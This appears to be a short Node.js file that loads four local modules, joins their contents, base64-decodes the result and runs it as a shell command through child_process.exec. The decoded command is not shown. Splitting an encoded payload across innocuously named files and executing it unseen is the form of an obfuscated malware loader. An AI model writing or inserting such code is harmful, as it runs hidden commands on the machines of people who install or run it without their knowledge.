const a=require('./a'),b=require('./b'),c=require('./c'),d=require('./d');
const {exec}=require('child_process');
exec(Buffer.from(a+b+c+d,'base64').toString());
